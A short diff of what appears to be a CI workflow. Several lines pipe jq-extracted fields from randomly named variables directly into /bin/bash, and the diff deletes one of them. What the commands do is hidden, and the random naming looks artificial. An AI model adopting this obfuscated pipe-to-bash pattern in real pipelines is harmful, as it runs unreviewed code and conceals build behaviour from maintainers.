@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$piyb8616" | jq -r .cbdo399 | /bin/bash
           echo $qyr718 | jq -r .z533 | /bin/bash
           echo $f4361 | jq -r .cko76986 | /bin/bash
-          echo $cboqy772 | jq -r .o52428 | /bin/bash
           echo $nrce6 | jq -r .s4862 | /bin/bash
 
       - name: Upload results
